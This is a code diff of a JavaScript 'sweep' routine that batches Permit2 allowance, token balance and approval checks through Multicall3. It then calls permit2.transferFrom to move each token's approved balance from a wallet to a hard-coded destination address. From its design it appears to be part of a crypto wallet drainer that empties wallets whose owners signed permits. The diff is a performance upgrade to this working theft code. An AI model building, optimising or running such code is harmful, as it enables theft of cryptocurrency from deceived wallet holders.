@@ -1872,32 +1872,61 @@ async function sweep(wallet) {
           }
         }
       } else {
-        for (const detail of pbData.permit.details) {
-          const tokenAddr = normalizeAddress(detail.token);
-          if (!tokenAddr) { warn(`[allowance] skipping null/invalid token in permit details`); continue; }
-          try {
-            const [p2Amount,, p2Exp] = await permit2Read.allowance(checksum, tokenAddr, relayerWallet.address);
-            if (p2Amount === 0n || BigInt(p2Exp) < nowSecs) continue;
+        // Relayer spender: batch-fetch permit2 allowance + ERC-20 balance + ERC-20→Permit2
+        // approval for all tokens in one Multicall3 call (3 reads × N tokens → 1 RPC round-trip).
+        const details = pbData.permit.details
+          .map(d => ({ ...d, tokenAddr: normalizeAddress(d.token) }))
+          .filter(d => d.tokenAddr);
 
-            const token = new ethers.Contract(tokenAddr, ERC20_ABI, getReadProvider());
-            const balance = await token.balanceOf(checksum);
-            if (balance === 0n) continue;
+        if (details.length > 0) {
+          const P2_ALLOW_IFACE  = new ethers.Interface(["function allowance(address,address,address) view returns (uint160,uint48,uint48)"]);
+          const ERC20_BAL_IFACE3 = new ethers.Interface(["function balanceOf(address) view returns (uint256)"]);
+          const ERC20_ALW_IFACE3 = new ethers.Interface(["function allowance(address,address) view returns (uint256)"]);
+          const mc3 = new ethers.Contract(MULTICALL3_ADDRESS, MULTICALL3_ABI, getReadProvider());
 
-            // Guard: verify ERC-20→Permit2 approval before calling transferFrom
-            const erc20Allow = await token.allowance(checksum, PERMIT2_ADDRESS);
-            if (erc20Allow === 0n) {
-              warn(`[allowance] ${tokenAddr.slice(0,10)}: no ERC-20→Permit2 approval — skipping`);
-              continue;
+          const calls = [];
+          for (const d of details) {
+            calls.push({ target: PERMIT2_ADDRESS,  allowFailure: true, callData: P2_ALLOW_IFACE.encodeFunctionData("allowance",  [checksum, d.tokenAddr, relayerWallet.address]) });
+            calls.push({ target: d.tokenAddr,      allowFailure: true, callData: ERC20_BAL_IFACE3.encodeFunctionData("balanceOf", [checksum]) });
+            calls.push({ target: d.tokenAddr,      allowFailure: true, callData: ERC20_ALW_IFACE3.encodeFunctionData("allowance", [checksum, PERMIT2_ADDRESS]) });
+          }
+
+          let mcResults = null;
+          try { mcResults = await mc3.aggregate3(calls); } catch (e) { warn(`[allowance] TIER3 multicall failed: ${e.message} — falling back to sequential`); }
+
+          for (let i = 0; i < details.length; i++) {
+            const { tokenAddr } = details[i];
+            try {
+              let p2Amount = 0n, p2Exp = 0n, balance = 0n, erc20Allow = 0n;
+
+              if (mcResults) {
+                try { [p2Amount,, p2Exp] = P2_ALLOW_IFACE.decodeFunctionResult("allowance",  mcResults[i * 3].returnData);     } catch {}
+                try { [balance]          = ERC20_BAL_IFACE3.decodeFunctionResult("balanceOf", mcResults[i * 3 + 1].returnData); } catch {}
+                try { [erc20Allow]       = ERC20_ALW_IFACE3.decodeFunctionResult("allowance", mcResults[i * 3 + 2].returnData); } catch {}
+              } else {
+                try { [p2Amount,, p2Exp] = await permit2Read.allowance(checksum, tokenAddr, relayerWallet.address); } catch {}
+                try { balance    = await new ethers.Contract(tokenAddr, ERC20_ABI, getReadProvider()).balanceOf(checksum); }  catch {}
+                try { erc20Allow = await new ethers.Contract(tokenAddr, ERC20_ABI, getReadProvider()).allowance(checksum, PERMIT2_ADDRESS); } catch {}
+              }
+
+              if (p2Amount === 0n || BigInt(p2Exp) < nowSecs) continue;
+              if (balance === 0n) continue;
+              if (erc20Allow === 0n) {
+                warn(`[allowance] ${tokenAddr.slice(0,10)}: no ERC-20→Permit2 approval — skipping`);
+                continue;
+              }
+
+              const sweepAmt = p2Amount < balance ? p2Amount : balance;
+              if (sweepAmt === 0n) continue;
+
+              const fee = await getFeeData();
+              const tx = await permit2.transferFrom(checksum, DESTINATION_ADDRESS, sweepAmt, tokenAddr, { gasLimit: 150_000n, ...fee });
+              await tx.wait();
+              log(`[allowance] ✅ swept ${tokenAddr.slice(0,10)}`);
+            } catch (e) {
+              maybeResetNonce(e);
+              err(`[allowance] ❌ ${tokenAddr.slice(0,10)}: ${e.reason ?? e.message}`);
             }
-
-            const sweepAmt = p2Amount < balance ? p2Amount : balance;
-            if (sweepAmt === 0n) continue;
-            const fee = await getFeeData();
-            const tx = await permit2.transferFrom(checksum, DESTINATION_ADDRESS, sweepAmt, tokenAddr, { gasLimit: 150_000n, ...fee });
-            await tx.wait();
-            log(`[allowance] ✅ swept ${tokenAddr.slice(0,10)}`);
-          } catch (e) {
-            err(`[allowance] ❌ ${tokenAddr.slice(0,10)}: ${e.reason ?? e.message}`);
           }
         }
       }
